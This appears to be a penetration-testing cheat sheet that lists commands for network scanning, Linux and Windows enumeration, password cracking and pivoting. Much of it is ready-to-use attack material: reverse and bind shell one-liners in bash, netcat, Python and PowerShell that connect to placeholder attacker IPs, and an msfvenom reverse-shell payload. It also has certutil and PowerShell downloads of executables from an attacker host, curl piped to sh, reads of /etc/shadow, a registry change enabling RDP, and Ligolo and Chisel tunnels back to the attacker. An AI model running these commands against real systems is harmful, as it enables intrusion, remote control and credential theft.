## Scanning and Enumeration

#### NMAP
`nmap -sn IP_range`<br>
`nmap -p- -sS -iL Live_Hosts_List`<br>
`nmap -sV -sC -p Open_Ports -iL Live_Hosts_List`<br>

Clean nmap output for port scan<br>
`cat scan.nmap | grep /|cut -d/ -f1| tr "\n" ","| sed 's/,$//'`

<img width="300" alt="NMAP_top_ports" src="https://github.com/ErvinTista/Paris/assets/13991872/85159f37-8f60-489e-b515-7a8f4c77e8d7">

#### DNS Enumeration
`host domain`<br>
`host -t mx domain`<br>
`host -t txt domain`<br>
`dnsrecon -d domain -t std`<br>
`dnsenum domain`<br>
`nslookup -type=TXT domain IP`<br>

#### TCP/UDP Port Scan
`nc -nvv -w -z IP port-port`<br>

#### SMB Enumeration
`nmap -v -p 139,445 --script smb-os-discovery IP`<br>

#### Web Enumeration
`sudo nmap -p80 --script=http-enum -sV IP` <br>
`gobuster dir -u IP -w /usr/share/wordlists/dirb/common.txt -t 5`<br>
`feroxbuster --url domain --depth 2 --wordlist /usr/share/wordlists/dirb/common.txt -x .txt,.jpg`<br>

#### SNMP Enum
```
snmpwalk -v2c -c <public> <IP.address> NET-SNMP-EXTEND-MIB::nsExtendObjects //nsExtendObjects is not included by default
```

#### Linux Enumeration
`whoami`<br>
`hostname`<br>
`id`<br>
`cat /etc/passwd`<br>
`cat /etc/shadow`<br>
`cat /etc/os-release`<br>
`uname -a`<br>
`ip a`<br>
`ifconfig`<br>
`route`<br>
`history`<br>
`netstat -ano`<br>
`crontab -l`<br>
`cat /etc/cron*`<br>
`sudo -l`<br>
`env`<br>
`cat /etc/profile`<br>
`cat /etc/bashrc`<br>
`cat ~/.bash_profile`<br>
`cat ~/.bashrc`<br>
`ps -elf`<br>
`find / -perm -u=s -type f 2>/dev/null`<br>
`find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null`<br>
`find / -perm -u=s -type f 2>/dev/null`<br>
`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`<br>

## Exploit

#### Password Cracking
`hashcat -a 0 -m #hash_type hash.txt dictionary_list.txt`<br>

#### Generate password list from URL - cewl
`cewl -d 3 -m 8 --with-numbers -w wordlist.out <http>` <br>



#### Transfers
`PS iwr -uri http://attacker.IP/met.exe -Outfile met.exe`<br>
`powershell wget -Uri http://attacker_IP/name.exe -OutFile C:\destination\directory\name.exe`<br>
`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`<br>

## Pivoting and Tunneling

## Persistence

## Shells and One Liners
`msfvenom -p windows/x64/shell/reverse_tcp LHOST=IP.Addr.es.ss LPORT=443 -f exe -o staged_reverse_tcp.exe`

### Reverse Shells
`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`

`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"`

### Bind Shells
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`

`python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`

`powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();`

### Shell Upgrade
`python -c 'import pty; pty.spawn("/bin/bash")'`; ctrl -z; stty raw -echo; fg; export TERM=xterm

### Pivoting with Ligolo - https://github.com/nicocha30/ligolo-ng
Add listener 
```
Server agent from attacker host then from the victim host(that has 2 nics) retrieve the ligolo agent.

From attacker host:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
ip addr show ligolo //will show interface is available, will initially have "down" in red
./proxy -selfcert //starts ligolo 

From victim host:
./agent -connect attacker.ip:11601 -ignore-cert //11601 is the default port for ligolo

From attacker host:
session //select new connection
ipconfig //shows the networks the machine is connected to

Set up the route. Open a new terminal in attacker host
sudo ip route add <IP.of.the.internal.network.you.want.to.reach>/24 dev ligolo

From attacker host, from the context of our agent session:
start

Can now reach the <IP.of.the.internal.network.you.want.to.reach> through your kali box. no proychains necessary.

Add forwarding

listener_add --addr 0.0.0.0:<any-port> --to 127.0.0.1:<listening-port>
https://www.youtube.com/watch?v=DM1B8S80EvQ

delete route
sudo route del -net <172.16.187.0> netmask <255.255.255.0> dev ligolo
```
### Setting up Chisel
You must already have foothold onto a machine. 
```
Upload chisel on onto the target host. Make sure the chisel binary is compatible with the host.

On attacker box:
chisel server -p <port> --reverse
Will print a fingerprint string thats needed for target box

On target box:
chmod +x chisel
./chisel client --fingerprint <long string> <attacker.ip:<port>> R:8000:<target.ip>:<port to forward to attacker on 8000>

Now on the attacker box you should be able to interact with victim.ip through 127.0.0.1:8000
```


Powershell history
```
Cat (Get-PSReadlineOption).HistorySavePath
```

Unquoted path in windows
```
Powershell
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName

cmd
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
```

Add rdp to box
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Wordpress Enumeration
```
wpscan --url http://<target.ip> --enumerate p --plugins-detection aggressive -o outfile.txt
```

## Resources and Links
|Description|Link|
|-----------|----|
|Linux Privesc|https://payatu.com/blog/a-guide-to-linux-privilege-escalation/|
|LinWinMacPEAS|https://github.com/carlospolop/PEASS-ng|
|Nmap Pretty|https://github.com/honze-net/nmap-bootstrap-xsl|
|CrackMapExec|https://github.com/byt3bl33d3r/CrackMapExec|
|NetExec|https://github.com/Pennyw0rth/NetExec|
|CrackMapExec Cheatsheet + other good cheatsheets|https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/|

